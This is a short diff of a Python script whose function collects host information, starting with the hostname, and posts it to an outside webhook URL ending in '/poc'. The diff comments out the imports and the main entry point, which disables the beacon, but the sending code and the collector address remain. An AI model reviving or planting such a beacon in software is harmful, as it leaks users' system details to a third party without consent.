@@ -1,6 +1,8 @@
-import socket
-import platform
-import requests
+# import socket
+# import platform
+# import requests
+# if __name__ == "__main__":
+#     main()
 
 def send_info_to_server(server_url):
     # Get hostname
@@ -33,7 +35,3 @@ def main():
     # Define your server URL
     server_url = "https://eobngnpuin253ze.m.pipedream.net/poc"
     send_info_to_server(server_url)
-
-if __name__ == "__main__":
-    main()
-
